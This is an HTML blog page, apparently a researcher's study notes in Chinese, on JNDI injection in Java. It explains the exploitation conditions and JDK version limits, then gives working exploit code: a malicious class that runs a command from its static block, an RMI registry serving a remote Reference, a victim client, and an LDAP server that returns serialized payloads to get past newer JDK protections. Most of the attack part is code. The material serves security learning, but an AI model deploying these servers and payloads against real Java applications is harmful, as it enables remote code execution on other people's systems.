@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=9bd5ca801b57208805a649cd598388a48ca56336">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>JNDI注入 | BlogPapers</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="JNDI注入" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="http://0.0.0.0:4000/2021/JNDI%E6%B3%A8%E5%85%A5.html" />
+<meta property="og:url" content="http://0.0.0.0:4000/2021/JNDI%E6%B3%A8%E5%85%A5.html" />
+<meta property="og:site_name" content="BlogPapers" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="JNDI注入" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","headline":"JNDI注入","url":"http://0.0.0.0:4000/2021/JNDI%E6%B3%A8%E5%85%A5.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>BlogPapers</h1>
+        </a>
+        <h2><a href="sumsec.me"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=24&pause=1000&color=FDFDFD&background=13797800&center=true&vCenter=true&width=435&lines=%F0%9F%91%8B%EF%BC%8C%E5%83%8F%E6%B8%85%E6%B0%B4%E4%B8%80%E8%88%AC%E6%B8%85%E6%BE%88%E9%80%8F%E6%98%8E" alt="SummerSec" /></a></h2>
+
+        <section id="downloads">
+          
+          <a href="https://github.com/SummerSec/BlogPapers" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h2 id="jndi注入">JNDI注入</h2>
+
+<p><strong>文中环境代码上传到https://github.com/SummerSec/JavaLearnVulnerability/tree/master/RMI%20JRMP%20JNDI</strong></p>
+
+<p><code class="language-plaintext highlighter-rouge">此文只是一篇笔记，所以有点乱。</code></p>
+
+<p>将恶意的Reference类绑定在RMI注册表中，其中恶意引用指向远程恶意的class文件，当用户在JNDI客户端的lookup()函数参数外部可控或Reference类构造方法的classFactoryLocation参数外部可控时，会使用户的JNDI客户端访问RMI注册表中绑定的恶意Reference类，从而加载远程服务器上的恶意class文件在客户端本地执行，最终实现JNDI注入攻击导致远程代码执行</p>
+
+<p><img src="https://img.sumsec.me/17u44er17ec/17u44er17ec.png" alt="image-20210427154417233" /></p>
+
+<h3 id="jndi注入的利用条件">jndi注入的利用条件</h3>
+
+<ul>
+  <li>客户端的lookup()方法的参数可控</li>
+  <li>服务端在使用Reference时，classFactoryLocation参数可控～</li>
+</ul>
+
+<p>上面两个都是在编写程序时可能存在的脆弱点（任意一个满足就行），除此之外，jdk版本在jndi注入中也起着至关重要的作用，而且不同的攻击响亮对jdk的版本要求也不一致，这里就全部列出来：</p>
+
+<ul>
+  <li>
+    <p>JDK 6u45、7u21之后：java.rmi.server.useCodebaseOnly的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</p>
+  </li>
+  <li>
+    <p>JDK 6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。</p>
+  </li>
+  <li>
+    <p>JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。</p>
+  </li>
+</ul>
+
+<h3 id="jndi注入-demo">jndi注入 demo</h3>
+
+<ul>
+  <li>创建一个恶意对象</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import javax.lang.model.element.Name;
+import javax.naming.Context;
+import java.io.BufferedInputStream;
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.util.HashMap;
+
+public class EvilObj {
+    public static void exec(String cmd) throws IOException {
+        String sb = "";
+        BufferedInputStream bufferedInputStream = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());
+        BufferedReader inBr = new BufferedReader(new InputStreamReader(bufferedInputStream));
+        String lineStr;
+        while((lineStr = inBr.readLine()) != null){
+            sb += lineStr+"\n";
+
+        }
+        inBr.close();
+        inBr.close();
+    }
+
+    public Object getObjectInstance(Object obj, Name name, Context context, HashMap&lt;?, ?&gt; environment) throws Exception{
+        return null;
+    }
+
+    static {
+        try{
+            exec("gnome-calculator");
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+    }
+}
+</code></pre></div></div>
+
+<p>可以看到这里利用的是static代码块执行命令</p>
+
+<ul>
+  <li>创建rmi服务端，绑定恶意的Reference到rmi注册表</li>
+</ul>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">com.sun.jndi.rmi.registry.ReferenceWrapper</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">javax.naming.NamingException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.naming.Reference</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.AlreadyBoundException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.RemoteException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.registry.LocateRegistry</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.registry.Registry</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Server</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">RemoteException</span><span class="o">,</span> <span class="nc">NamingException</span><span class="o">,</span> <span class="nc">AlreadyBoundException</span> <span class="o">{</span>
+        <span class="nc">Registry</span> <span class="n">registry</span> <span class="o">=</span> <span class="nc">LocateRegistry</span><span class="o">.</span><span class="na">createRegistry</span><span class="o">(</span><span class="mi">1099</span><span class="o">);</span>
+        <span class="nc">String</span> <span class="n">url</span> <span class="o">=</span> <span class="s">"http://127.0.0.1:6666/"</span><span class="o">;</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Create RMI registry on port 1099"</span><span class="o">);</span>
+        <span class="nc">Reference</span> <span class="n">reference</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Reference</span><span class="o">(</span><span class="s">"EvilObj"</span><span class="o">,</span> <span class="s">"EvilObj"</span><span class="o">,</span> <span class="n">url</span><span class="o">);</span>
+        <span class="nc">ReferenceWrapper</span> <span class="n">referenceWrapper</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ReferenceWrapper</span><span class="o">(</span><span class="n">reference</span><span class="o">);</span>
+        <span class="n">registry</span><span class="o">.</span><span class="na">bind</span><span class="o">(</span><span class="s">"evil"</span><span class="o">,</span> <span class="n">referenceWrapper</span><span class="o">);</span>
+    <span class="o">}</span>
+
+<span class="o">}</span>
+</code></pre></div></div>
+
+<ul>
+  <li>创建一个客户端（受害者）</li>
+</ul>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">javax.naming.Context</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.naming.InitialContext</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.naming.NamingException</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Client</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">NamingException</span> <span class="o">{</span>
+        <span class="nc">Context</span> <span class="n">context</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">InitialContext</span><span class="o">();</span>
+        <span class="n">context</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="s">"rmi://localhost:1099/evil"</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>可以看到这里的lookup方法的参数是指向我设定的恶意rmi地址的。</p>
+
+<p>然后先编译该项目，生成class文件，然后在class文件目录下用python启动一个简单的HTTP Server:</p>
+
+<p><code class="language-plaintext highlighter-rouge">python -m SimpleHTTPServer 6666</code></p>
+
+<p>执行上述命令就会在6666端口、当前目录下运行一个HTTP  Server：</p>
+
+<p><img src="https://img.sumsec.me/32u47er32ec/32u47er32ec.png" alt="image-20210427154732163" /></p>
+
+<p>然后运行Server端，启动rmi registry服务</p>
+
+<p><img src="https://img.sumsec.me/47u47er47ec/47u47er47ec.png" alt="" /></p>
+
+<p>成功弹出计算器。注意,我这里用到的jdk版本为jdk7</p>
+
+<p><img src="https://img.sumsec.me/2u48er2ec/2u48er2ec.png" alt="image-20210427154801968" /></p>
+
+<hr />
+
+<h3 id="高版本jdk绕过使用序列化对象进行bypass">高版本JDK绕过，使用序列化对象进行Bypass</h3>
+
+<p>其实一直以来JNDI有两种方式注入</p>
+
+<p>LDAP can be used to store Java objects by using several special Java attributes. There are at least two ways a Java object can be represented in an LDAP directory:</p>
+
+<p>● Using Java serialization
+ https://docs.oracle.com/javase/jndi/tutorial/objects/storing/serial.html
+● Using JNDI References
+ https://docs.oracle.com/javase/jndi/tutorial/objects/storing/reference.html</p>
+
+<p><img src="https://img.sumsec.me/summersec//14u24er14ec/14u24er14ec.png" alt="img" /></p>
+
+<ul>
+  <li>JDK 6u132, JDK 7u122, JDK 8u113中添加了com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false。</li>
+</ul>
+
+<p><strong>导致jndi的rmi reference方式失效，但ldap的reference方式仍然可行</strong></p>
+
+<ul>
+  <li>Oracle JDK 11.0.1、8u191、7u201、6u211之后 com.sun.jndi.ldap.object.trustURLCodebase属性的默认值被调整为false。</li>
+</ul>
+
+<p><strong>导致jndi的ldap reference方式失效，到这里为止，远程codebase的方式基本失效，除非认为设为tr</strong></p>
+
+<p><strong>com/sun/jndi/ldap/Obj.java做了两个判断1. reference 2. Serializable</strong></p>
+
+<p><img src="https://img.sumsec.me/summersec//46u24er46ec/46u24er46ec.png" alt="img" /></p>
+
+<p>一是利用远程codebase的方式，二是利用本地ClassPath里的反序列化利用链。在最新版的jdk8u中，codebase的方式依赖com.sun.jndi.ldap.object.trustURLCodebase的值，而第二种方式仍未失效。</p>
+
+<p>如果在返回的属性中存在javaSerializedData，将继续调用deserializeObject函数，该函数主要就是调用常规的反序列化方式readObject对序列化数据进行还原</p>
+
+<p><img src="https://img.sumsec.me/summersec//33u27er33ec/33u27er33ec.png" alt="image-20211130152733686" /></p>
+
+<p>实现代码：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>package summersec.ldap;
+
+import com.unboundid.ldap.listener.InMemoryDirectoryServer;
+import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
+import com.unboundid.ldap.listener.InMemoryListenerConfig;
+import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
+import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
+import com.unboundid.ldap.sdk.Entry;
+import com.unboundid.ldap.sdk.LDAPException;
+import com.unboundid.ldap.sdk.LDAPResult;
+import com.unboundid.ldap.sdk.ResultCode;
+import com.unboundid.util.Base64;
+import java.io.FileInputStream;
+import java.net.InetAddress;
+import java.net.MalformedURLException;
+import java.net.URL;
+import java.text.ParseException;
+import javax.net.ServerSocketFactory;
+import javax.net.SocketFactory;
+import javax.net.ssl.SSLSocketFactory;
+
+public class LdapServer {
+    private static final String LDAP_BASE = "dc=example,dc=com";
+
+    public LdapServer() {
+    }
+
+    public static String readFile(String filePath) throws Exception {
+        String result = "ser.payload";
+        return result;
+    }
+
+    public static void main(String[] args) throws Exception {
+        String url = "http://127.0.0.1/#T";
+        String ports = "8080";
+        int port = 8080;
+        String file = "1.ser";
+        String POC = readFile(file);
+
+
+        try {
+            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(new String[]{"dc=example,dc=com"});
+            config.setListenerConfigs(new InMemoryListenerConfig[]{new InMemoryListenerConfig("listen", InetAddress.getByName("0.0.0.0"), port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory)SSLSocketFactory.getDefault())});
+            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url), POC));
+            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
+            System.out.println("Listening on 0.0.0.0:" + port);
+            ds.startListening();
+        } catch (Exception var8) {
+            var8.printStackTrace();
+        }
+
+    }
+
+    private static class OperationInterceptor extends InMemoryOperationInterceptor {
+        private URL codebase;
+        private String POC;
+
+        public OperationInterceptor(URL cb, String POC) {
+            this.codebase = cb;
+            this.POC = POC;
+        }
+
+        public void processSearchResult(InMemoryInterceptedSearchResult result) {
+            String base = result.getRequest().getBaseDN();
+            Entry e = new Entry(base);
+
+            try {
+                this.sendResult(result, base, e);
+            } catch (Exception var5) {
+                var5.printStackTrace();
+            }
+
+        }
+
+        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws LDAPException, MalformedURLException {
+            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
+            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
+            e.addAttribute("javaClassName", "Exploit");
+            String cbstring = this.codebase.toString();
+            int refPos = cbstring.indexOf(35);
+            if (refPos &gt; 0) {
+                cbstring.substring(0, refPos);
+            }
+            try {
+                e.addAttribute("javaSerializedData", Base64.decode(this.POC));
+            } catch (ParseException var8) {
+                var8.printStackTrace();
+            }
+            result.sendSearchEntry(e);
+            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
+        }
+    }
+}
+</code></pre></div></div>
+
+<p>可以使用项目<a href="https://github.com/Firebasky/LdapBypassJndi">LdapBypassJndi</a>，工具将代码实现了ldap序列化对象的漏洞利用。</p>
+
+
+      </section>
+    </div>
+  </body>
+</html>
